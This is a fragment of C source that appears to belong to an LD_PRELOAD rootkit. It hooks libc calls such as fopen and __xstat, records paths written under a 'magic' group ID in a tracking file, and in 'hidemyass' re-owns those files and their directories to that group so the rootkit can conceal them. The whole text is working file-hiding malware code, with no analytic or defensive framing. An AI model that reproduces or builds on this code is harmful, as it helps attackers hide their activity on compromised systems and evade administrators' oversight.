int pathtracked(const char *pathname){
    if(pathname[0] != '/')
        return 1;

    for(int i = 0; i != NOTRACK_SIZE; i++)
        if(!strncmp(notrack[i], pathname, strlen(notrack[i])))
            return 1;

    hook(CFOPEN, C__XSTAT);

    struct stat assstat;
    memset(&assstat, 0, sizeof(struct stat));
    if((long)call(C__XSTAT, _STAT_VER, pathname, &assstat) < 0)
        return 1;

    if(!S_ISREG(assstat.st_mode) && !S_ISDIR(assstat.st_mode))
        return 1;

    if(assstat.st_gid != readgid())
        return 1;

    if(strstr(pathname, "swp")){ // ignore very temporary swp files
        char *pathnamedup = strdup(pathname),
             *pathnametok = strtok(pathnamedup, ".");
        int count = 0;
        while(pathnametok != NULL){
            if(!strncmp(pathnametok, "swp", 3) && count > 1){
                free(pathnamedup);
                return 1;
            }
            count++;
            pathnametok = strtok(NULL, ".");
        }
        free(pathnamedup);
    }

    int tracked = 0;
    FILE *fp;
    char line[PATH_MAX];
    memset(line, 0, sizeof(line));
    
    fp = call(CFOPEN, ASS_PATH, "r");
    if(fp == NULL) return 0; // cant open the file..just say ok write it
    
    while(fgets(line, sizeof(line), fp) != NULL){
        if(!strcmp(line, pathname)){
            tracked = 1;
            break;
        }
    }
    fclose(fp);

    return tracked;
}

void trackwrite(const char *pathname){
    FILE *fp;
    char buf[strlen(pathname)+2];
    hook(CFOPEN, CFWRITE);
    fp = call(CFOPEN, ASS_PATH, "a");
    if(fp == NULL) return;
    snprintf(buf,sizeof(buf),"%s\n",pathname);
    call(CFWRITE, buf, strlen(buf), 1, fp);
    fclose(fp);
    chown_path(ASS_PATH, readgid());
}

void hidemyass(void){
    FILE *fp;
    struct stat assstat, assdirstat;
    gid_t magicgid;

    hook(CFOPEN, C__XSTAT);

    fp = call(CFOPEN, ASS_PATH, "r");

    if(fp != NULL){
        char line[PATH_MAX];
        memset(line, 0, sizeof(line));
        magicgid = readgid();
        while(fgets(line, sizeof(line), fp) != NULL){
            line[strlen(line)-1]='\0';

            memset(&assstat, 0, sizeof(struct stat));
            if((long)call(C__XSTAT, _STAT_VER, line, &assstat) < 0)
                continue;

            if(assstat.st_gid == 0)
                continue; // assume path has been manually unhidden...

            if(S_ISDIR(assstat.st_mode))
                hidedircontents(line, magicgid);
            else if(S_ISREG(assstat.st_mode))
                chown_path(line, magicgid);

            char *assdirname = dirname(line);
            if(assdirname == NULL) continue;

            memset(&assdirstat, 0, sizeof(struct stat));
            if((long)call(C__XSTAT, _STAT_VER, assdirname, &assdirstat) < 0)
                continue;

            if(assdirstat.st_gid != 0)
                hidedircontents(assdirname, magicgid);
        }

        fclose(fp);
    }
}
